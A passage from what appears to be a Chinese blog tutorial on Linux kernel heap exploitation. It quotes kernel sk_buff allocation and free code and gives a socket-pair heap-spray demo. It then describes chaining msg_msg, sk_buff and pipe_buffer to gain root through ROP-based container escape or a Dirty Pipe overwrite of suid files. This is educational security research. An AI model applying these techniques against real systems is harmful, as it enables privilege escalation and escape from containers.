+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>sk_memalloc_socks</span>() <span style=color:#666>&amp;&amp;</span> (flags <span style=color:#666>&amp;</span> SKB_ALLOC_RX))
+</span></span><span style=display:flex><span>                gfp_mask <span style=color:#666>|=</span> __GFP_MEMALLOC;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>/* Get the HEAD */</span>
+</span></span><span style=display:flex><span>        skb <span style=color:#666>=</span> <span style=color:#06287e>kmem_cache_alloc_node</span>(cache, gfp_mask <span style=color:#666>&amp;</span> <span style=color:#666>~</span>__GFP_DMA, node);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>skb)
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>goto</span> out;
+</span></span><span style=display:flex><span>        <span style=color:#06287e>prefetchw</span>(skb);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>/* We do our best to align skb_shared_info on a separate cache
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>         * line. It usually works because kmalloc(X &gt; SMP_CACHE_BYTES) gives
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>         * aligned memory blocks, unless SLUB/SLAB debug is enabled.
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>         * Both skb-&gt;head and skb_shared_info are cache line aligned.
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>         */</span>
+</span></span><span style=display:flex><span>        size <span style=color:#666>=</span> <span style=color:#06287e>SKB_DATA_ALIGN</span>(size);
+</span></span><span style=display:flex><span>        size <span style=color:#666>+=</span> <span style=color:#06287e>SKB_DATA_ALIGN</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> skb_shared_info));
+</span></span><span style=display:flex><span>        data <span style=color:#666>=</span> <span style=color:#06287e>kmalloc_reserve</span>(size, gfp_mask, node, <span style=color:#666>&amp;</span>pfmemalloc);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>data)
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>goto</span> nodata;
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>/* kmalloc(size) might give us more room than requested.
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>         * Put skb_shared_info exactly at the end of allocated zone,
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>         * to allow max possible filling before reallocation.
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>         */</span>
+</span></span><span style=display:flex><span>        size <span style=color:#666>=</span> <span style=color:#06287e>SKB_WITH_OVERHEAD</span>(<span style=color:#06287e>ksize</span>(data));
+</span></span><span style=display:flex><span>        <span style=color:#06287e>prefetchw</span>(data <span style=color:#666>+</span> size);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>/*
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>         * Only clear those fields we need to clear, not those that we will
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>         * actually initialise below. Hence, don&#39;t put any more fields after
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>         * the tail pointer in struct sk_buff!
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>         */</span>
+</span></span><span style=display:flex><span>        <span style=color:#06287e>memset</span>(skb, <span style=color:#40a070>0</span>, <span style=color:#06287e>offsetof</span>(<span style=color:#007020;font-weight:700>struct</span> sk_buff, tail));
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>/* Account for allocated memory : skb + skb-&gt;head */</span>
+</span></span><span style=display:flex><span>        skb<span style=color:#666>-&gt;</span>truesize <span style=color:#666>=</span> <span style=color:#06287e>SKB_TRUESIZE</span>(size);
+</span></span><span style=display:flex><span>        skb<span style=color:#666>-&gt;</span>pfmemalloc <span style=color:#666>=</span> pfmemalloc;
+</span></span><span style=display:flex><span>        <span style=color:#06287e>refcount_set</span>(<span style=color:#666>&amp;</span>skb<span style=color:#666>-&gt;</span>users, <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>        skb<span style=color:#666>-&gt;</span>head <span style=color:#666>=</span> data;
+</span></span><span style=display:flex><span>        skb<span style=color:#666>-&gt;</span>data <span style=color:#666>=</span> data;
+</span></span><span style=display:flex><span>        <span style=color:#06287e>skb_reset_tail_pointer</span>(skb);
+</span></span><span style=display:flex><span>        skb<span style=color:#666>-&gt;</span>end <span style=color:#666>=</span> skb<span style=color:#666>-&gt;</span>tail <span style=color:#666>+</span> size;
+</span></span><span style=display:flex><span>        skb<span style=color:#666>-&gt;</span>mac_header <span style=color:#666>=</span> (<span style=color:#06287e>typeof</span>(skb<span style=color:#666>-&gt;</span>mac_header))<span style=color:#666>~</span><span style=color:#40a070>0U</span>;
+</span></span><span style=display:flex><span>        skb<span style=color:#666>-&gt;</span>transport_header <span style=color:#666>=</span> (<span style=color:#06287e>typeof</span>(skb<span style=color:#666>-&gt;</span>transport_header))<span style=color:#666>~</span><span style=color:#40a070>0U</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>/* make sure we initialize shinfo sequentially */</span>
+</span></span><span style=display:flex><span>        shinfo <span style=color:#666>=</span> <span style=color:#06287e>skb_shinfo</span>(skb);
+</span></span><span style=display:flex><span>        <span style=color:#06287e>memset</span>(shinfo, <span style=color:#40a070>0</span>, <span style=color:#06287e>offsetof</span>(<span style=color:#007020;font-weight:700>struct</span> skb_shared_info, dataref));
+</span></span><span style=display:flex><span>        <span style=color:#06287e>atomic_set</span>(<span style=color:#666>&amp;</span>shinfo<span style=color:#666>-&gt;</span>dataref, <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (flags <span style=color:#666>&amp;</span> SKB_ALLOC_FCLONE) {
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>struct</span> sk_buff_fclones <span style=color:#666>*</span>fclones;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                fclones <span style=color:#666>=</span> <span style=color:#06287e>container_of</span>(skb, <span style=color:#007020;font-weight:700>struct</span> sk_buff_fclones, skb1);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                skb<span style=color:#666>-&gt;</span>fclone <span style=color:#666>=</span> SKB_FCLONE_ORIG;
+</span></span><span style=display:flex><span>                <span style=color:#06287e>refcount_set</span>(<span style=color:#666>&amp;</span>fclones<span style=color:#666>-&gt;</span>fclone_ref, <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                fclones<span style=color:#666>-&gt;</span>skb2.fclone <span style=color:#666>=</span> SKB_FCLONE_CLONE;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#06287e>skb_set_kcov_handle</span>(skb, <span style=color:#06287e>kcov_common_handle</span>());
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#002070;font-weight:700>out</span>:
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> skb;
+</span></span><span style=display:flex><span><span style=color:#002070;font-weight:700>nodata</span>:
+</span></span><span style=display:flex><span>        <span style=color:#06287e>kmem_cache_free</span>(cache, skb);
+</span></span><span style=display:flex><span>        skb <span style=color:#666>=</span> <span style=color:#007020>NULL</span>;
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>goto</span> out;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#06287e>EXPORT_SYMBOL</span>(__alloc_skb);
+</span></span></code></pre></div><p>这个函数中我们主要关心他对堆的操作，首先可见 <code>sk_buff</code> 是在这里分配的</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// in __alloc_skb
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>skb <span style=color:#666>=</span> <span style=color:#06287e>kmem_cache_alloc_node</span>(cache, gfp_mask <span style=color:#666>&amp;</span> <span style=color:#666>~</span>__GFP_DMA, node);
+</span></span></code></pre></div><p>这里使用的不再是 <code>kmalloc</code> 而是 <code>kmem_cache_alloc_node</code> 了，这是从指定 <code>node</code> 的特定 <code>cache</code> 中分配内存块的函数。 <code>node</code> 是内核对主存的抽象，主要用于 NUMA 计算机。而 <code>cache</code> 在这里可能是 <code>skbuff_fclone_cache</code> 和 <code>skbuff_head_cache</code> 中的一个：</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// in __alloc_skb
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>cache <span style=color:#666>=</span> (flags <span style=color:#666>&amp;</span> SKB_ALLOC_FCLONE)
+</span></span><span style=display:flex><span>  <span style=color:#666>?</span> <span style=color:#002070;font-weight:700>skbuff_fclone_cache</span> : skbuff_head_cache;
+</span></span></code></pre></div><p>所以他是被隔离的，不过数据包并不是</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// in __alloc_skb
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>size <span style=color:#666>=</span> <span style=color:#06287e>SKB_DATA_ALIGN</span>(size);
+</span></span><span style=display:flex><span>size <span style=color:#666>+=</span> <span style=color:#06287e>SKB_DATA_ALIGN</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> skb_shared_info));
+</span></span><span style=display:flex><span>data <span style=color:#666>=</span> <span style=color:#06287e>kmalloc_reserve</span>(size, gfp_mask, node, <span style=color:#666>&amp;</span>pfmemalloc);
+</span></span></code></pre></div><p>可见他是通过 <code>kmalloc_reserve</code> 来分配的，最后仍然会通过 <code>kmalloc</code> 分配，通过创建一对 socket ，然后发送数据包，我们就几乎可以做到内核中的任意大小对象分配。不过可以看到上面会加上 <code>struct skb_shared_info</code> 的大小，所以其实只能做到 <code>kmalloc-512</code> 以上的任意大小对象分配。</p><p>后面也会对 <code>struct skb_shared_info</code> 进行初始化</p><p><a id=code-snippet--skb-end-pointer></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> <span style=color:#666>*</span><span style=color:#06287e>skb_end_pointer</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> sk_buff <span style=color:#666>*</span>skb)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> skb<span style=color:#666>-&gt;</span>head <span style=color:#666>+</span> skb<span style=color:#666>-&gt;</span>end;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><a id="code-snippet--init of `struct skb-shared-info` in `--alloc-skb`"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020>#define skb_shinfo(SKB)	((struct skb_shared_info *)(skb_end_pointer(SKB)))
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/* make sure we initialize shinfo sequentially */</span>
+</span></span><span style=display:flex><span>shinfo <span style=color:#666>=</span> <span style=color:#06287e>skb_shinfo</span>(skb);
+</span></span><span style=display:flex><span><span style=color:#06287e>memset</span>(shinfo, <span style=color:#40a070>0</span>, <span style=color:#06287e>offsetof</span>(<span style=color:#007020;font-weight:700>struct</span> skb_shared_info, dataref));
+</span></span></code></pre></div><h3 id=释放-sk-buff><span class=section-num>3.3</span> 释放 <code>sk_buff</code></h3><p>释放一个数据很容易，把它读取掉就可以来。内核中使用 <code>kfree_skb</code> 来实现对一个数据包的释放</p><p><a id=code-snippet--kfree-skb></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>kfree_skb</span>(<span style=color:#007020;font-weight:700>struct</span> sk_buff <span style=color:#666>*</span>skb)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span><span style=color:#06287e>skb_unref</span>(skb))
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#06287e>trace_kfree_skb</span>(skb, <span style=color:#06287e>__builtin_return_address</span>(<span style=color:#40a070>0</span>));
+</span></span><span style=display:flex><span>        <span style=color:#06287e>__kfree_skb</span>(skb);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#06287e>EXPORT_SYMBOL</span>(kfree_skb);
+</span></span></code></pre></div><p><a id=code-snippet--kfree-skb></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	__kfree_skb - private function
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@skb: buffer
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	Free an sk_buff. Release anything attached to the buffer.
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	Clean the state. This is an internal helper function. Users should
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	always call kfree_skb
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>__kfree_skb</span>(<span style=color:#007020;font-weight:700>struct</span> sk_buff <span style=color:#666>*</span>skb)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>        <span style=color:#06287e>skb_release_all</span>(skb);
+</span></span><span style=display:flex><span>        <span style=color:#06287e>kfree_skbmem</span>(skb);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#06287e>EXPORT_SYMBOL</span>(__kfree_skb);
+</span></span></code></pre></div><p><a id=code-snippet--skb-release-all></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/* Free everything but the sk_buff shell. */</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>void</span> <span style=color:#06287e>skb_release_all</span>(<span style=color:#007020;font-weight:700>struct</span> sk_buff <span style=color:#666>*</span>skb)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>        <span style=color:#06287e>skb_release_head_state</span>(skb);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>likely</span>(skb<span style=color:#666>-&gt;</span>head))
+</span></span><span style=display:flex><span>                <span style=color:#06287e>skb_release_data</span>(skb);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>可见一层层调用最后通过 <code>skb_release_all</code> 来 free 掉一个 <code>sk_buff</code> ，我们并不关心他对 <code>struct sk_buff</code> 的“壳”做了什么，只关心他是怎么 free 掉数据包的，可见是通过 <code>skb_release_data</code> 实现</p><p><a id=code-snippet--skb-release-data></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>void</span> <span style=color:#06287e>skb_release_data</span>(<span style=color:#007020;font-weight:700>struct</span> sk_buff <span style=color:#666>*</span>skb)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> skb_shared_info <span style=color:#666>*</span>shinfo <span style=color:#666>=</span> <span style=color:#06287e>skb_shinfo</span>(skb);
+</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> i;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (skb<span style=color:#666>-&gt;</span>cloned <span style=color:#666>&amp;&amp;</span>
+</span></span><span style=display:flex><span>            <span style=color:#06287e>atomic_sub_return</span>(skb<span style=color:#666>-&gt;</span>nohdr <span style=color:#666>?</span> (<span style=color:#40a070>1</span> <span style=color:#666>&lt;&lt;</span> SKB_DATAREF_SHIFT) <span style=color:#666>+</span> <span style=color:#40a070>1</span> <span style=color:#666>:</span> <span style=color:#40a070>1</span>,
+</span></span><span style=display:flex><span>                              <span style=color:#666>&amp;</span>shinfo<span style=color:#666>-&gt;</span>dataref))
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>for</span> (i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> shinfo<span style=color:#666>-&gt;</span>nr_frags; i<span style=color:#666>++</span>)
+</span></span><span style=display:flex><span>                <span style=color:#06287e>__skb_frag_unref</span>(<span style=color:#666>&amp;</span>shinfo<span style=color:#666>-&gt;</span>frags[i]);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (shinfo<span style=color:#666>-&gt;</span>frag_list)
+</span></span><span style=display:flex><span>                <span style=color:#06287e>kfree_skb_list</span>(shinfo<span style=color:#666>-&gt;</span>frag_list);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#06287e>skb_zcopy_clear</span>(skb, <span style=color:#007020>true</span>);
+</span></span><span style=display:flex><span>        <span style=color:#06287e>skb_free_head</span>(skb);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>前面的都是对尾部附着的 <code>skb_shared_info</code> 结构体进行操作，最后还是通过 <code>skb_free_head</code> 进行 free 。</p><p><a id=code-snippet--skb-free-head></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>void</span> <span style=color:#06287e>skb_free_head</span>(<span style=color:#007020;font-weight:700>struct</span> sk_buff <span style=color:#666>*</span>skb)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>        <span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>head <span style=color:#666>=</span> skb<span style=color:#666>-&gt;</span>head;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (skb<span style=color:#666>-&gt;</span>head_frag)
+</span></span><span style=display:flex><span>                <span style=color:#06287e>skb_free_frag</span>(head);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>else</span>
+</span></span><span style=display:flex><span>                <span style=color:#06287e>kfree</span>(head);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h3 id=堆喷的方式><span class=section-num>3.4</span> 堆喷的方式</h3><p>做法很朴素，首先创建大量 socket pair 用来互相收发数据包。然后喷射时通过写端向每个 socket 中写入数据包，此时就进行了多次特定大小的内存分配，需要 free 时就从读端读出即可。以下是一个简单的 demo 。</p><p><a id="code-snippet--sk-buff spray demo"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>sk_buff_spray</span>(<span style=color:#902000>int</span> sk_socket[SOCKET_SUM][<span style=color:#40a070>2</span>], <span style=color:#902000>void</span> <span style=color:#666>*</span>buf, <span style=color:#902000>size_t</span> size) {
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> SOCKET_SUM; i<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> j <span style=color:#666>=</span> <span style=color:#40a070>0</span>; j <span style=color:#666>&lt;</span> SK_BUFF_IN_ONE_SOCKET; j<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>write</span>(sk_socket[i][<span style=color:#40a070>0</span>], buf, size) <span style=color:#666>!=</span> size) {
+</span></span><span style=display:flex><span>        <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] write sk_buff&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>sk_buff_free</span>(<span style=color:#902000>int</span> sk_socket[SOCKET_SUM][<span style=color:#40a070>2</span>], <span style=color:#902000>void</span> <span style=color:#666>*</span>buf, <span style=color:#902000>size_t</span> size) {
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> SOCKET_SUM; i<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> j <span style=color:#666>=</span> <span style=color:#40a070>0</span>; j <span style=color:#666>&lt;</span> SK_BUFF_IN_ONE_SOCKET; j<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>read</span>(sk_socket[i][<span style=color:#40a070>1</span>], buf, size) <span style=color:#666>!=</span> size) {
+</span></span><span style=display:flex><span>        <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] read sk_buff&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>这个堆喷的好处是头部数据即可控，而且还可以读出头部数据。所以如果能够做到对 <code>sk_buff</code> 指向的数据包 UAF ，利用就很容易了（比如对于 kmalloc-1024 来说，就有有一个基于 dirty pipe 的，非常好用的 <code>pipe_buffer</code> 原语。另一方面，通过 <code>pipe_buffer</code> 内部的虚表，也可以实现内核 rop）。</p><h2 id=结合-msg-msg-sk-buff-转化堆溢出><span class=section-num>4</span> 结合 <code>msg_msg</code> <code>sk_buff</code> 转化堆溢出 <span class=tag><span class=exploit_trick>exploit-trick</span></span></h2><p>刚才说了，通过 <code>msg_msg</code> 堆喷，我们可以把堆溢出转化为 UAF（获得一根指向已被 free 的内存块的悬垂指针）。那么能不能把这个 UAF 变成对 <code>pipe_buffer</code> 的完全控制呢？我们可以把 <code>sk_buff</code> 数据包占位到 victim second msg 上，然后用悬垂指针 free 掉 victim second msg，再喷射 <code>pipe_buffer</code> 占位到此处，就可以用 <code>sk_buff</code> 来完全控制 <code>pipe_buffer</code> 了。</p><p>不过用悬垂指针 free victim second msg ，需要经过一次 unlink 操作（通过 <code>list_del</code> 实现），虽然不像 glibc 一样有一堆检查，但是我们至少要伪造一个合法的地址避免错误，也就是说我们需要 leak 出内核堆地址。</p><p>由于 <code>sk_buff</code> 可以控制堆块的头部数据，所以我们可以通过喷射占位到上面 <code>msg_msg</code> 的 victim second msg 上，改写其 <code>m_ts</code> 字段（表示消息的长度），这样就可以越界读出 victim second msg 的下一个 msg 的 <code>m_list.prev</code> 和 <code>m_list.next</code> 指针值了。</p><p><a id="figure--how sk-buff help msg-msg oob read"></a></p><figure><img src=https://raw.githubusercontent.com/chujDK/ImageHost/main/PicGoIMage/sk_buff_help_msg_msg_oob_read.svg></figure><p>其中 <code>m_list.prev</code> 指向的是 victim first msg 的下一个 msg 。拿到这个指针就有一个内核堆地址了。而且其中的数据无关紧要，可以作为 unlink 时的 prev 和 next 值。</p><p>在获得了堆地址后，再一次使用 <code>sk_buff</code> 堆喷，写入一个“合法”的 m_list ，通过悬垂指针 free 掉 victim second msg 。此时我们仍然可以通过 <code>sk_buff</code> 来控制这个堆块。并且由于被 free 掉了，大小为 <code>kmalloc-1024</code> ，我们申请大量的 pipe 就可以喷射 <code>pipe_buffer</code> 并占位到这个堆块上了（ <code>pipe_buffer</code> 是内核中实现管道通信的核心数据结构，每个大小 40 bytes ，代表管道文件的一个页。而 linux 中管道默认大小为 16 个页，所以创建一个管道就会申请一个 640 byte 的内存块，也就是 <code>kmalloc-1024</code> 了）。</p><p>此时通过读出 <code>sk_buff</code> 就可以读取到 <code>pipe_buffer</code> 中的数据（占位到堆块中的会是一个 <code>pipe_buffer</code> 数组）。</p><p><a id="code-snippet--struct pipe-buffer"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> pipe_buffer {
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> page <span style=color:#666>*</span>page;
+</span></span><span style=display:flex><span>        <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> offset, len;
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> pipe_buf_operations <span style=color:#666>*</span>ops;
+</span></span><span style=display:flex><span>        <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> flags;
+</span></span><span style=display:flex><span>        <span style=color:#902000>unsigned</span> <span style=color:#902000>long</span> private;
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><p>其中有一张虚表 <code>pipe_buf_operations</code> ，可以让我们 leak 内核基地址。（虽然可能并不需要）</p><p>获取 <code>pipe_buffer</code> 的数据后，我们再一次喷射 <code>sk_buff</code> ，又会占位到原来的 <code>pipe_buffer</code> 中，此时写入伪造数据即可通过 <code>pipe_buffer</code> 完成利用。这里有两种方法：</p><ol><li>通过劫持虚表 <code>ops</code> 字段来 rop ，主要针对需要容器逃逸的情况
+rop 时执行 <code>switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</code> 即可改变名称空间完成逃逸</li><li>对于 linux 5.8=+：修改 <code>flags</code> 字段，添加上 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标识
+对于 linux 5.8-：劫持 <code>ops</code> 字段，使之指向 <code>struct anon_pipe_buf_ops</code>
+然后通过 <code>splice</code> 系统调用直接改写 root owned suid 程序文件（即 <strong>CVE-2022-0847</strong> <em>dirty pipe</em> ）
